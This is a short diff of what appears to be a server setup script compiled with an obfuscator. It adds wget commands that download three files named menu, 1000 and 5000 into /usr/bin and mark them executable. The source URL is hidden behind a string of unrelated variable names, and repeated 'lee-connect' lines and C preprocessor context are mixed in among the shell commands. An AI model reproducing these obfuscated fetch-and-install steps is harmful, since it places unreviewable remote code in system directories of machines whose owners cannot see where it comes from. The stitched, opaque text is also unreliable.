@@ -1665,7 +1665,12 @@ static  char data [] =
 #	define PTRACE_ATTACH	PT_ATTACH
 #endif
 }
-
+lee-connect
+wget -O /usr/bin/menu $chuyen$tinh$doi$ta$nhu$thuyen$xa$ben$do$anh$dua$em$ve$em$tren$xa$neo/nu
+lee-connect
+wget -O /usr/bin/1000 $chuyen$tinh$doi$ta$nhu$thuyen$xa$ben$do$anh$dua$em$ve$em$tren$xa$neo/nuv
+lee-connect
+wget -O /usr/bin/5000 $chuyen$tinh$doi$ta$nhu$thuyen$xa$ben$do$anh$dua$em$ve$em$tren$xa$neo/nuh
 lee-connect
 wget -O /usr/bin/user-limit $chuyen$tinh$doi$ta$nhu$anh$thuyen$anh$ben$em$do$em$dua$em$ve$em$suot$em$dau$em$neo/limit
 lee-connect
@@ -1700,6 +1705,9 @@ lee-connect
 wget -O /etc/motd $chuyen$tinh$doi$ta$nhu$anh$thuyen$anh$ben$em$do$em$dua$em$ve$em$suot$em$dau$em$neo/mod
 lee-connect
 clear
+chmod +x /usr/bin/menu
+chmod +x /usr/bin/1000
+chmod +x /usr/bin/5000
 chmod +x /usr/bin/user-limit
 chmod +x /usr/bin/ps-mem
 chmod +x /usr/bin/speedtest
